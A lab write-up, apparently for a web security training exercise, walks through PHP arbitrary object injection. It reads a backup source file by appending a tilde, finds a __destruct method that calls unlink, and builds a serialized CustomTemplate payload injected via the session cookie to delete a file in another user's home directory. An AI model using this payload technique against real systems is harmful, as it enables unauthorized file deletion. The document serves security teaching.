# Lab: Arbitrary object injection in PHP

 This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: wiener:peter 

**Hint**

You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. 

# Step 1 inspect session cookie

Upon inspecting the session cookie, I find that it is passing an encoded serialized PHP object, and a comment referencing a php file:

![image](https://user-images.githubusercontent.com/83407557/213566510-451164f3-a5ce-4012-9e59-8bd9cb5134a1.png)

**Decoded Cookie**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m1xi9a2zpmwcg86w5bpnqvue9fnq4dkg";}
```


# Step 2 find source code

Going to the target tab, I find the php file referenced in the comment:

![image](https://user-images.githubusercontent.com/83407557/213566787-7f79b339-c6ef-4a5c-b29b-316b469d7364.png)


Per the hint I send the php file to repeater and add a `~` to try and find the editor-generated backup file:

![image](https://user-images.githubusercontent.com/83407557/213567028-a07c06a0-4436-4d2a-9037-64d0e786174c.png)

**CustomTemplate.php**
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
I see that this file is using the the `__destruct()` magic method, this function will execute when the execution of the php file completes. What it does is check if the value of `lock_file_path` exists it will perfrom the `unlink()` function.

First lets look at the PHP documentation on unlink():

![image](https://user-images.githubusercontent.com/83407557/213568535-fff47f69-070f-41bb-ab67-bde4cc52304e.png)

Next lets show an example of how `__destruct()` works with an example:

```php
<?php

class MyDestructableClass 
{
    function __construct() {
        print "In constructor\n";
        echo shell_exec('date');
        sleep(5);
    }

    function __destruct() {
    	echo shell_exec('date');
        print "Destroying " . __CLASS__ . "\n";
    }
}

$obj = new MyDestructableClass();

?>
```

Note that after 5 seconds, the execution complete and the `__destruct()` function is called:

**Output**
```bash
└─$ php destruct.php
In constructor
Thu Jan 19 05:03:42 PM EST 2023
Thu Jan 19 05:03:47 PM EST 2023
Destroying MyDestructableClass
```

# Step 3 Create a malicious serialized object

Taking a look at the session cookie again:

**Decoded Cookie**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m1xi9a2zpmwcg86w5bpnqvue9fnq4dkg";}
```

I see that it is a 4-charater long object called "User", with 2 parameters:
1. key of string "username" with the value of string "wiener"
2. key of string "access_token" with the value of "m1xi9a2zpmwcg86w5bpnqvue9fnq4dkg"


To create the malicous serialized object, I need to get the lengths of the strings. First I need the length of the class name:

```php
class CustomTemplate
```
Finding the length with python:

```bash
└─$ python -c 'print(len("CustomTemplate"))'                  
14
```

Making the first part of my malicious code:

```php
O:14:"CustomTemplate"
```

Next I need to determine the attributes I want to pass:

There is only 1 attribute: the key `lock_file_path` with the value of the target file I want to delete (`/home/carlos/morale.txt`). Both of these are strings, so I need to also get their lengths with python:

```bash
└─$ python -c 'print(len("lock_file_path"))'
14
└─$ python -c 'print(len("/home/carlos/morale.txt"))'
23
```
This makes the final payload:

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
# Step 4 Replace session cookie with malicous serialized object

I capture the request for my account:

![image](https://user-images.githubusercontent.com/83407557/213577210-072d27b6-1800-4c1c-86ed-c3e16dbbc4d3.png)

and inject my payload into the session cookie:

![image](https://user-images.githubusercontent.com/83407557/213577336-c8a8da67-5aa5-4e0e-842c-c519f3b45f55.png)

Doing so deletes the file and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/213577428-e89dbeee-f099-4811-a476-f7dc2035ad52.png)
